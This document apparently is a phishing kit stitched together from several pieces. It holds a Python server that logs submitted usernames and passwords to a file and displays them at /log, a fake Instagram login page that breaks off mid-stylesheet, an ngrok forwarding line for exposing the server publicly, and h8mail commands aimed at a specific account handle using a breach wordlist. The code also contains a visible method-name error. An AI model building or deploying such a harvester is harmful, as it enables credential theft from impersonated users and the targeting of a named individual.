#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime, os

CREDS_FILE = "captured_creds.txt"

class CaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/log':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_header()
            if os.path.exists(CREDS_FILE):
                with open(CREDS_FILE) as f:
                    self.wfile.write(f.read().encode())
            else:
                self.wfile.write(b"No captures yet.")
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            with open('index.html') as f:
                self.wfile.write(f.read().encode())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers['Content-Length'])
            body = self.rfile.read(length)
            data = json.loads(body)
            with open(CREDS_FILE, 'a') as f:
                f.write(f"[{datetime.datetime.now()}] {data['username']}:{data['password']}\n")
            print(f"\n[!] CAPTURED: {data['username']}:{data['password']}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

port = 8080
print(f"[+] Server running on http://0.0.0.0:{port}")
print(f"[+] Open http://0.0.0.0:{port} in browser")
print(f"[+] Captured credentials: http://0.0.0.0:{port}/log")
server = HTTPServer(('0.0.0.0', port), CaptureHandler)
server.serve_forever()<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }
    .login-box {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 20px;
      max-width: 350px;
      width: 100%;
      text-align: center;
      margin-bottom: 10px;
    }
    .logo { margin-bottom: 24px; }
    .logo svg { width: 175px; }
    form { display: flex; flex-direction: column; gap: 6px; }
    input {
      width: 100%;
      padding: 9px 8px 7px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      outline: none;
    }
    input:focus { border-color: #a8a8a8; }
    button {
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 7px 16px;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      margin-top: 8px;
    }
    button:hover { background: #0081df; }
    .divider {
      display: flex;
      align-items: center;
      margin: 16px 0;Forwarding  https://abc123.ngrok-free.app -> http://localhost:80# Install
pip install h8mail

# Use
h8mail -t kuldip__005 -bc "https://raw.githubusercontent.com/awesome-wordlists/breach-compilation/main/breach.txt"
